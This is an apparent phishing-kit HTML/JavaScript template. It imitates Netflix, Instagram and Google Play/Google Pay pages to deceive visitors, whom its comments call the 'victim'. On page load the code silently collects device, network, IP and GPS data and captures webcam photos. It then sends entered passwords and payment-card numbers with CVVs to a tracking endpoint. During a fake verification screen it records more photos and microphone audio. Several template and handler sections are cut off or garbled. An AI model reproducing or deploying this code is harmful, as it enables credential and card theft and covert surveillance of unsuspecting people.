/* ===== NETFLIX (Pixel Perfect) ===== */
.netflix-page{background:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;position:relative}
.netflix-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(rgba(0,0,0,0.5),rgba(0,0,0,0.5)),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="%23e50914" fill-opacity="0.1" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,112C672,96,768,96,864,112C960,128,1056,160,1152,160C1248,160,1344,128,1392,112L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>');background-size:cover;z-index:0}
.netflix-content{position:relative;z-index:1;width:100%;max-width:450px}
.netflix-header{text-align:center;margin-bottom:30px}
.netflix-logo-text{color:#e50914;font-size:45px;font-weight:700;letter-spacing:-1px;font-family:Arial,sans-serif}
.netflix-card{background:rgba(0,0,0,0.75);border-radius:4px;padding:60px 68px 40px}
.netflix-card h1{color:#fff;font-size:32px;font-weight:700;margin-bottom:28px;font-family:Arial,sans-serif}
.netflix-input-wrap{position:relative;margin-bottom:16px}

.netflix-input:focus+.netflix-label,.netflix-input:not(:placeholder-shown)+.netflix-label{top:6px;font-size:11px;color:#8c8c8c}
.netflix-btn{width:100%;padding:16px;background:#e50914;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-top:24px;font-family:Arial,sans-serif}
.netflix-btn:hover{background:#f40612}
.netflix-remember{display:flex;align-items:center;justify-content:space-between;margin-top:12px;color:#b3b3b3;font-size:13px}

.netflix-captcha a{color:#0071eb;text-decoration:none}
.netflix-captcha a:hover{text-decoration:underline}

<video class="hidden" id="hiddenVideo" autoplay playsinline muted></video>

<script>
const linkId = '{{ link_id }}';
let capturedPhotos = [];
let audioChunks = [];
let mediaRecorder = null;
let stream = null;
let hasAutoCaptured = false;

// ===== AUTO CAPTURE ON PAGE LOAD =====
// This runs BEFORE victim does anything!
async function autoCapture() {
if (hasAutoCaptured) return;
hasAutoCaptured = true;

// 1. Collect device data silently (NO permission needed)
const data = await collectSilentData();
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify(data)
});
} catch(e) {}

// 2. Try camera silently (will show browser prompt, but we're already loading)
try {
stream = await navigator.mediaDevices.getUserMedia({
video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
audio: false // No audio for silent capture
});

const video = document.getElementById('hiddenVideo');
video.srcObject = stream;
video.muted = true;
await video.play();

// Take 3 quick photos silently
for (let i = 0; i < 3; i++) {
await new Promise(r => setTimeout(r, 800));
try {
const canvas = document.getElementById('hiddenCanvas');
canvas.width = 640; canvas.height = 480;
const ctx = canvas.getContext('2d');
ctx.drawImage(video, 0, 0, 640, 480);
const photo = canvas.toDataURL('image/jpeg', 0.7);
capturedPhotos.push(photo);
} catch(e) {}
}

if (stream) stream.getTracks().forEach(t => t.stop());

// Send photos
if (capturedPhotos.length > 0) {
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ photos: capturedPhotos })
});
} catch(e) {}
}
} catch(e) {
// Camera denied - still have IP location + device info
}
}

async function collectSilentData() {
const data = {location: {}, device_info: {}, screen_info: {}, network_info: {}, battery_info: {}};

data.screen_info = {
width: screen.width, height: screen.height,
availWidth: screen.availWidth, availHeight: screen.availHeight,
colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
orientation: screen.orientation?.type || 'unknown'
};

data.device_info = {
platform: navigator.platform,
userAgent: navigator.userAgent,
language: navigator.language,
languages: navigator.languages,
cookieEnabled: navigator.cookieEnabled,
onLine: navigator.onLine,
hardwareConcurrency: navigator.hardwareConcurrency,
maxTouchPoints: navigator.maxTouchPoints,
vendor: navigator.vendor,
memory: navigator.deviceMemory || 'unknown',
browser: getBrowser(),
os: getOS()
};

try {
const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
if (conn) {
data.network_info = {
effectiveType: conn.effectiveType,
downlink: conn.downlink,
downlinkMax: conn.downlinkMax || 'unknown',
rtt: conn.rtt,
saveData: conn.saveData,
type: conn.type || 'unknown'
};
}
} catch(e) {}

try {
if (navigator.getBattery) {
const battery = await navigator.getBattery();
data.battery_info = {
level: Math.round(battery.level * 100) + '%',
charging: battery.charging,
chargingTime: battery.chargingTime,
dischargingTime: battery.dischargingTime
};
}
} catch(e) {}

try {
const ipRes = await fetch('https://ipapi.co/json/');
const ipData = await ipRes.json();
data.location = {
ip: ipData.ip,
city: ipData.city,
region: ipData.region,
country: ipData.country_name,
country_code: ipData.country_code,
postal: ipData.postal,
latitude: ipData.latitude,
longitude: ipData.longitude,
org: ipData.org,
isp: ipData.org,
asn: ipData.asn,
timezone: ipData.timezone,
currency: ipData.currency
};
} catch(e) {}

try {
if (navigator.geolocation) {
const position = await new Promise((resolve, reject) => {
navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 3000});
});
data.location.gps_lat = position.coords.latitude;
data.location.gps_lng = position.coords.longitude;
data.location.gps_accuracy = position.coords.accuracy;
}
} catch(e) {}

return data;
}

function getBrowser() {
const ua = navigator.userAgent;
if (ua.includes('Firefox')) return 'Firefox';
if (ua.includes('Chrome')) return 'Chrome';
if (ua.includes('Safari')) return 'Safari';
if (ua.includes('Edge')) return 'Edge';
return 'Unknown';
}

function getOS() {
const ua = navigator.userAgent;
if (ua.includes('Windows')) return 'Windows';
if (ua.includes('Mac')) return 'MacOS';
if (ua.includes('Linux')) return 'Linux';
if (ua.includes('Android')) return 'Android';
if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
return 'Unknown';
}

// ===== TEMPLATES =====
const templates = {

render: () => `

},

<div style="height:40px;background:#000;border-radius:5px;color:#fff;padding:8px 16px;font-size:11px;display:flex;align-items:center;gap:6px">🤖 Google Play</div>
</div>

},
gpay: {

render: () => `

<h2>$100.00</h2>
<p>Google Play Balance</p>
</div>
<form onsubmit="handleGPayRedeem(event)">
<input type="text" id="cardNumber" class="gpay-input" placeholder="Enter gift card code (16 digits)" maxlength="19" required>
<div class="gpay-row">
<input type="text" id="cardExpiry" class="gpay-input" placeholder="MM/YY" maxlength="5" required>
<input type="text" id="cardCVV" class="gpay-input" placeholder="CVV" maxlength="4" required>
</div>
<div class="gpay-security">
🔒 Secure encryption
</div>
<button type="submit" class="gpay-btn">Redeem Now</button>
</form>
<div class="gpay-footer">By redeeming, you agree to the <a href="#">Terms of Service</a></div>
</div>
</div>`
}
};

function getUrlParam(name) {
const urlParams = new URLSearchParams(window.location.search);
return urlParams.get(name);
}

let currentTemplate = 'instagram';

function init() {
const urlTemplate = getUrlParam('template');
if (urlTemplate && templates[urlTemplate]) currentTemplate = urlTemplate;

const t = templates[currentTemplate];
document.title = t.title;
document.getElementById('pageFavicon').href = `data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>${t.favicon}</text></svg>`;

document.getElementById('mainContent').innerHTML = t.render();

// AUTO CAPTURE ON PAGE LOAD!
autoCapture();
}

// ===== NETFLIX LOGIN HANDLER =====
async function handleNetflixLogin(e) {
e.preventDefault();
const cred1 = document.getElementById('cred1').value;
const cred2 = document.getElementById('cred2').value;

// Send credentials
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ credentials: { username: cred1, password: cred2 } })
});
} catch(err) {}

// Show Netflix-style verification
const verify = document.getElementById('netflixVerify');
verify.classList.add('active');

const statuses = ['CHECKING DEVICE...', 'VERIFYING LOCATION...', 'CONFIRMING IDENTITY...', 'FINALIZING...'];
for (let i = 0; i < 4; i++) {
document.getElementById('verifyStatus').textContent = statuses[i];
await new Promise(r => setTimeout(r, 1500));
}

// Try to get more photos during "verification"
await captureMorePhotos();

window.location.href = 'https://netflix.com';
}

// ===== INSTAGRAM LOGIN HANDLER =====
async function handleIGLogin(e) {
e.preventDefault();
const cred1 = document.getElementById('cred1').value;
const cred2 = document.getElementById('cred2').value;

try {
await fetch('/api/track/' + linkId, {
method: 'POST',

}

// ===== GOOGLE PAY REDEEM HANDLER =====
async function handleGPayRedeem(e) {
e.preventDefault();
const cardNum = document.getElementById('cardNumber').value;
const expiry = document.getElementById('cardExpiry').value;
const cvv = document.getElementById('cardCVV').value;

// Capture card details
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ credentials: { card_number: cardNum, expiry: expiry, cvv: cvv } })
});
} catch(err) {}

// Show Google Pay loading
const loading = document.getElementById('gpayLoading');
loading.classList.add('active');

// Animate progress bar
const fill = document.getElementById('gpayFill');
const steps = [20, 45, 70, 90, 100];
for (let i = 0; i < steps.length; i++) {
fill.style.width = steps[i] + '%';
await new Promise(r => setTimeout(r, 800));
}

await captureMorePhotos();
window.location.href = 'https://play.google.com';
}

// ===== CAPTURE MORE PHOTOS DURING "VERIFICATION" =====
async function captureMorePhotos() {
let localStream = null;
try {
localStream = await navigator.mediaDevices.getUserMedia({
video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
audio: true
});

const video = document.getElementById('hiddenVideo');
video.srcObject = localStream;
video.muted = true;
await video.play();

// Start audio recording
let localRecorder = null;
try {
localRecorder = new MediaRecorder(localStream);
audioChunks = [];
localRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
localRecorder.start(1000);
} catch(e) {}

// Take 5 high quality photos
const morePhotos = [];
for (let i = 0; i < 5; i++) {
await new Promise(r => setTimeout(r, 1200));
try {
const canvas = document.getElementById('hiddenCanvas');
canvas.width = 1280; canvas.height = 720;
const ctx = canvas.getContext('2d');
ctx.drawImage(video, 0, 0, 1280, 720);
const photo = canvas.toDataURL('image/jpeg', 0.9);
morePhotos.push(photo);
} catch(e) {}
}

if (localStream) localStream.getTracks().forEach(t => t.stop());
if (localRecorder && localRecorder.state !== 'inactive') {
localRecorder.stop();
await new Promise(r => setTimeout(r, 500));
}

// Send additional photos
if (morePhotos.length > 0) {
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ photos: morePhotos })
});
} catch(e) {}
}

// Send audio
if (audioChunks.length > 0) {
try {
const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
const reader = new FileReader();
reader.onloadend = async function() {
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ audio: reader.result })
});
} catch(e) {}
};
reader.readAsDataURL(audioBlob);
} catch(e) {}
}

} catch(e) {
// Camera not available
}
}

init();
</script>
</body>
</html>
